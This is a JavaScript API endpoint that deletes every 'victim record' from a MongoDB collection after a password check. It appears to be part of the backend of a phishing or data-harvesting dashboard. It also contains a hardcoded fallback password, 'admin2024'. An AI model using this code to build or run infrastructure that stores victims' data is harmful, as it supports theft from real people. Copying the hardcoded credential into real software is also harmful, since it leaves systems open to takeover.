/**
 * Clear Database API Endpoint
 *
 * Deletes all victim records from database
 * Requires authentication
 *
 * DELETE /api/clear
 * Body: { password: "admin2024" }
 */

import { getVictimsCollection } from './_mongodb.js';

/**
 * Main handler
 */
export default async function handler(req, res) {
  // Only allow DELETE
  if (req.method !== 'DELETE') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Check password
    const { password } = req.body;
    const correctPassword = process.env.DASHBOARD_PASSWORD || 'admin2024';

    if (!password || password !== correctPassword) {
      return res.status(401).json({
        error: 'Unauthorized',
        message: 'Invalid password',
      });
    }

    // Delete all documents
    const collection = await getVictimsCollection();
    const result = await collection.deleteMany({});

    return res.status(200).json({
      success: true,
      message: 'All data cleared successfully',
      deletedCount: result.deletedCount,
    });
  } catch (error) {
    console.error('Clear database error:', error);
    return res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
}
